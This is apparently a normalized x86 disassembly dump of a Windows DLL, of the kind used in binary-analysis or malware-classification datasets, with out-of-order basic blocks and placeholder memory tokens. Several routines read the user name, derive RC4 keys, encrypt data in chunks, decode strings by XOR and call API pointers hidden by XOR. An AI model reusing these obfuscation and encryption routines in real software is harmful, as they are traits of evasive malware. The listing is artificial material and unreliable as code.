test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
mov edx [ edi ]
cmp edx [ esp + 0x1c ]
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
mov [ eax ] 0xc8
jmp r-xdata
sub_10036380
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_10036400
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
add eax ecx
mov [ esi + 0x8 ] eax
mov eax 0x1
xor edx edx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] edx
mov [ esi + 0x1c ] edx
mov [ esi + 0x2c ] eax
cmp ecx edx
je r-xdata
mov [ esi + 0xc ] 0xffffffff
pop esi
pop ebp
retn
call sub_10078790
pop esi
pop ebp
retn
sub_10036443
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_1001c615
mov esi [ eax ]
call sub_1001c615
cmp esi [ eax ]
jl r-xdata
call sub_10003200
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_10036470
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x80 ]
call eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x88 ]
push edi
push eax
call edx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x70 ]
push 0x2000
push eax
call edx
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
mov [ ebp - 0x210 ] 0x208
call [ GetUserNameW@IAT ]
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x78 ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1003650a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001d665
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_10036540
push ebp
mov ebp esp
push 0xffffffff
push sub_100812c2
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10046ed0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10046ed0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_10036380
sub_10036625
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x3e8
mov [ ebp - 0x18 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0xc ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x800001
push 0x6801
push [ ebp - 0xc ]
call [ CryptGenKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000616f
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x14 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x8
push ebx
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp - 0x14 ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x800000
push [ ebp - 0x14 ]
push 0x6801
push [ ebp - 0xc ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
push 0x8
push 0x0
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] 0x0
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ edi ]
add eax 0x4
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ebx [ ebp + 0xc ]
push eax
call sub_1003d950
mov eax [ ebp - 0x10 ]
pop ecx
pop ecx
push eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
movzx eax [ ebp + 0x13 ]
push ebx
push 0x0
push eax
push 0x0
push [ ebp - 0x8 ]
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x10 ] eax
add [ edi ] 0x4
mov eax [ edi ]
add eax [ ebp - 0x4 ]
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push [ ebp + 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x1c ]
push ebx
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
add ebx [ ebp - 0x18 ]
call sub_1003d950
push [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_10013670
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ edi ] ecx
mov eax [ edi ]
mov edx [ esi ]
sub eax ecx
sub eax 0x4
push eax
push edx
lea ebx [ edx + ecx + 0x4 ]
call sub_1003d950
mov eax [ ebp - 0x4 ]
mov ebx [ esi ]
add eax 0x4
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_1003d950
push [ ebp - 0x4 ]
mov ebx [ esi ]
push [ ebp + 0x10 ]
add ebx 0x4
call sub_1003d950
add esp 0x18
push [ ebp + 0x10 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x10 ]
mov eax [ edi ]
sub eax ecx
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
sub_100368ff
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100230e4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_10036940
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
not edx
xor edx eax
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x40 ]
push edx
mov ecx esi
call sub_100531b0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_10039b60
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10036a29
push 0x4
mov eax sub_1007f289
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100014b7
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_1002c0fd
push esi
call sub_1006591f
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10050f50
call sub_1004db01
retn
sub_10036a80
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x30
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
push ebx
mov [ esp + 0x1c ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x20 ] ecx
mov ecx [ ebp + 0x18 ]
push esi
xor eax eax
mov [ esp + 0x28 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x2c ] ecx
mov ecx [ ebp + 0x20 ]
mov bl 0x38
push eax
mov [ esp + 0x34 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x38 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_10036b90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x20 ]
mov [ ebx ] eax
mov [ esi ] ecx
mov edx [ ebx ]
push edi
cmp edx [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebx ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov edi [ ebp + 0x1c ]
cmp [ esi ] edi
je r-xdata
mov eax [ ebx ]
movzx edx [ eax ]
cmp edx 0x10ffff
ja r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
cmp edx 0x80
jae r-xdata
mov ecx edx
cmp edx 0x800
jae r-xdata
mov cl dl
xor eax eax
jmp r-xdata
cmp edx 0x10000
jae r-xdata
shr ecx 0x6
or cl 0xc0
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0x0
jne r-xdata
cmp edx 0x200000
jae r-xdata
shr ecx 0xc
or cl 0xe0
mov eax 0x2
jmp r-xdata
sub edi [ esi ]
lea ebx [ eax + 0x1 ]
cmp edi ebx
mov ebx [ ebp + 0x14 ]
jl r-xdata
mov [ ebx ] 0x1
cmp edx 0x4000000
jae r-xdata
shr ecx 0x12
or cl 0xf0
mov eax 0x3
jmp r-xdata
add [ ebx ] 0x2
mov edi [ esi ]
mov [ edi ] cl
inc [ esi ]
mov edi [ esi ]
test eax eax
jle r-xdata
shr ecx 0x1e
or cl 0xfc
mov eax 0x5
shr ecx 0x18
or cl 0xf8
mov eax 0x4
jmp r-xdata
mov edx [ ebx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
lea ecx [ eax + eax * 2 ]
add ecx ecx
jmp r-xdata
sub ecx 0x6
mov ebx edx
shr ebx cl
dec eax
mov [ ebp + 0x20 ] ecx
and bl 0x3f
or bl 0x80
mov [ edi ] bl
inc [ esi ]
mov edi [ esi ]
test eax eax
jg r-xdata
mov ecx [ ebp + 0x20 ]
mov ebx [ ebp + 0x14 ]
sub_10036cc0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1002c5ed
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1005d320
mov eax esi
cmp eax esi
jae r-xdata
sub_10036d40
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xf4 ]
lea edx [ ebp - 0xf8 ]
mov esi ecx
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_1002ae80
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0xdd
mov [ ebp - 0xfc ] ebx
call sub_100050e0
lea ecx [ ebp - 0xfc ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
mov eax 0xb7
call sub_100050e0
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x4c ]
mov eax 0x33
mov [ ebp - 0xf0 ] ebx
call sub_100050e0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x11
call sub_100050e0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x60 ]
mov eax 0xfb
mov [ ebp - 0xec ] ebx
call sub_100050e0
lea edx [ ebp - 0xec ]
push edx
lea eax [ ebp - 0x60 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xd8
call sub_100050e0
push 0x20
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xea
call sub_100050e0
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
xor eax eax
fldz
mov [ eax + 0x4 ] ebx
fstp [ eax + 0x10 ]
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x3d
call sub_100050e0
mov ebx ecx
mov edi eax
call sub_100393b0
xor ebx ebx
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
mov esi [ ebp - 0xe8 ]
mov [ esi ] eax
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x82
call sub_100050e0
mov ecx [ ebp - 0xe8 ]
mov edi [ ecx ]
mov ebx eax
call sub_1005c900
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x8
call sub_100050e0
mov edx [ ebp - 0xe8 ]
mov edi [ edx ]
mov ebx eax
call sub_1001fef0
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xfc ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x12b
call sub_100050e0
fldz
mov ecx [ esi ]
fstp [ ecx + 0x10 ]
push eax
call sub_10032fc8
mov eax [ esi ]
fstp [ eax + 0x10 ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x17
call sub_100050e0
mov eax [ esi ]
mov [ eax + 0x18 ] ebx
push eax
call sub_10032fc8
fnstcw [ ebp - 0xe6 ]
movzx eax [ ebp - 0xe6 ]
mov edx [ esi ]
add esp 0x4
or eax 0xc00
mov [ ebp - 0x100 ] eax
fldcw [ ebp - 0x100 ]
fistp [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
mov [ edx + 0x18 ] eax
fldcw [ ebp - 0xe6 ]
jmp r-xdata
mov eax [ ebp - 0xec ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_10036ffb
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x800003
push 0x6801
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
xor eax eax
inc eax
lea eax [ ebp - 0x8 ]
push eax
call sub_1000616f
jmp r-xdata
push [ ebx ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x8
xor eax eax
inc eax
cmp eax edi
je r-xdata
push ebx
push eax
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_100370f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1006b090
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10037140
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov edi [ ebx ]
cmp edi [ eax ]
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10050f50
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebx ] esi
call sub_100014b7
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
lea ecx [ ebp + 0x8 ]
call sub_10050f50
pop esi
inc eax
mov [ esi + 0x4 ] eax
sub_100371bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
lea eax [ ecx + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_100177a8
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_10037201
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10017c6a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1003729e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10022b5a
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_100372e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax + eax * 2 ]
lea esi [ esi * 4 + r--data ]
xor cl cl
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx ] 0x0
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
xor eax eax
nop
mov edx [ esi ]
mov dl [ edx + eax ]
xor dl [ esi + 0x8 ]
xor dl cl
inc cl
mov [ eax + edi ] dl
movzx eax cl
cmp eax [ esi + 0x4 ]
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + eax ] 0x0
pop edi
pop esi
pop ebp
retn
sub_10037330
push ecx
push rw-data
call sub_100534c0
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10037365
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
